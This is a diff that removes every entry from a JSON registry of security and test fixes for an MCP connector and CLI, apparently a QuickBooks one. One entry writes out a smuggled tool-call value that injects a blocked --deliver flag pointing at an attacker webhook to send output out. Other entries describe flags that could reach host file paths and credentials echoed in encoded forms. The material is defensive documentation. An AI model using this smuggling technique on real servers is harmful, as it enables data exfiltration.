-   "summary": "The novel-command acceptance fixtures seed every QBO date as a whole-day offset from the day the test runs, not as an absolute 2026 date, so the seeded books keep the same shape on any future date",
-   "why": "seedNovelStore hard-coded absolute dates (INV-1 due 2026-04-30, INV-2 due 2026-07-15, BILL-1 due 2026-06-20) while the commands under test read the wall clock: the Cobra layer passes time.Now() into analytics.CashForecast, analytics.StaleInvoices and analytics.Aging. Those fixtures encoded a 'today' of roughly 2026-05, so the assertions only held for a 75-day window. Once the calendar passed 2026-07-15 every seeded invoice was overdue, and both TestNovelCashForecastAcceptance (overdue_inflows 800 instead of 500, an empty 8-week window, net_in_window 0) and TestNovelInvoicesStaleAcceptance (INV-2 joined the collections list) failed on the calendar rather than on a code change. This is a TEST defect, not a product one - the shipped commands correctly forecast from the real current date, and the analytics layer already takes an injected `now` that its own unit tests pin. The fix moves the fixtures onto that same footing: novelSeedDay() reads the clock exactly once and seedDate() renders integer day offsets from it, so the books are translation-invariant. The reference day is anchored in UTC even though its year/month/day come from the local clock, because AddDate over a local midnight that does not exist on a spring-forward day (America/Santiago, Asia/Beirut) normalizes back to 23:00 the previous day and would slip every derived date by one. Offsets were chosen to clear every bucket, window and overdue boundary by a wide margin, because fixture dates parse as UTC midnight while the commands floor 'today' in local time - a skew of up to 14 hours. Proven both directions across 658800 (reference-day, time-zone, hour) combinations spanning 2026-2045 over 15 zones including the DST-hostile ones: 0 failures with the relative fixtures, and the same sweep run against the old absolute fixtures fails on 7245 of 7320 reference days, so the check discriminates rather than passing by construction. The tests also got stronger on the way through: the pinned reference lets them assert overdue_outflows, the beyond-window split, net_in_window and which forward week each open item buckets into, none of which could be asserted while 'today' was unknown. The as_of assertion brackets the command with two clock reads (dayBefore before the run, dayAfter after it) and requires dayBefore <= as_of <= dayAfter, both bounds inclusive: flooring to whole days is monotonic over the ordered reads t0 <= t1 <= t2, so a midnight crossing on either side of the command is admitted while a genuinely stale or future as_of still fails.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the acceptance-test template should seed clock-relative dates for any connector whose novel commands take a `now`, rather than emitting absolute date literals that rot. Worth noting for the same retro: no local novel command exposes an --as-of / reference-date flag (only `report balance-sheet` has one), so a caller cannot reproduce a cash-forecast or aging run as of a past date. Adding one is a product change and is deliberately NOT part of this fix.",
-   "asserts": [
-    {
-     "file": "cli/internal/cli/novel_acceptance_test.go",
-     "contains": "func novelSeedDay() time.Time {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/novel_acceptance_test.go",
-     "contains": "func seedDate(ref time.Time, offsetDays int) string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/novel_acceptance_test.go",
-     "contains": "seedDate(ref, inv1DueOff)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/novel_acceptance_test.go",
-     "contains": "net_in_window",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/novel_acceptance_test.go",
-     "contains": "if asOf < dayBefore || asOf > dayAfter {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/novel_prior_acceptance_test.go",
-     "contains": "days_past_due",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "mcp-executor-request-contracts",
-   "summary": "MCP discovery exposes executor-facing request schemas and indexes input names and known enum values",
-   "why": "Issue #351: endpoint summaries omitted required request inputs. Keep canonical JSON body case and nesting, path/header/query routing, and exact short request search terms. Contracts are derived from the shipped CLI source, and the existing CLI commands and auth remain intact. Upstream request metadata fix #4890 was not merged when this surgical repair was made.",
-   "status": "active",
-   "spec_encode_followup": "Replace this downstream contract extraction only when a released Printing Press generates equally complete executor-facing schemas and preserves every existing hand-fix.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/code_orch.go",
-     "contains": "\"params_schema\":",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/code_orch.go",
-     "contains": "codeOrchRequestScore(ep, query)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/code_orch.go",
-     "contains": "codeOrchResolveContract(ep, ep.Path, params)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/code_orch.go",
-     "contains": "codeOrchHasBody(ep)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/request_contract.go",
-     "contains": "func loadRequestContracts()",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/request_contracts.json",
-     "contains": "\"properties\""
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). `auth refresh` (internal/cli/auth_refresh.go refreshAccessToken) funnels the token endpoint's error body with the client secret and refresh token it sent. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cli/auth_refresh.go",
-     "contains": "cliutil.FunnelWithhold(strings.TrimSpace(string(body)), []string{clientSecret, refreshToken})",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/quickbooks-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/quickbooks-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/quickbooks-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
-    }
-   ]
-  },
-  {
-   "id": "chatgpt-desktop-local-web-unsupported",
-   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
-   "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
-   "status": "active",
-   "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "## ChatGPT desktop app (OpenAI)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "## ChatGPT (Developer Mode)"
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "*Remote* agents (ChatGPT"
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nYes, in the **ChatGPT desktop app**.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Plus/Pro+"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Developer Mode"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "Microsoft 365 Copilot, Gemini, and any agent"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Yes, in the ChatGPT desktop app.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "connects only to remote"
-    }
-   ]
-  }
- ]
+  ]
 }
